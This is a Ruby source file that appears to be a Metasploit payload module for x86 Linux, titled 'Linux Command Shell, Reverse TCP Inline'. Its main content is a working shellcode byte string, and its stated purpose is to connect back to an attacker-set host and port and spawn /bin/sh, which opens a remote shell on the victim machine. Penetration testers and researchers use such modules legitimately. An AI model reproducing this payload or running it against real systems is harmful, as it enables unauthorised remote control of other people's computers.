require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Linux
module X86

module ShellReverseTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 0x1a, 'ADDR' ],
							'LPORT'    => [ 0x20, 'n'    ],
						},
					'Payload' =>
						"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59" +
						"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x7f\x00\x00\x01\x66\x68" +
						"\xbf\xbf\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd" +
						"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +
						"\x89\xe1\xb0\x0b\xcd\x80"
				}
			))
	end

end

end end end end end
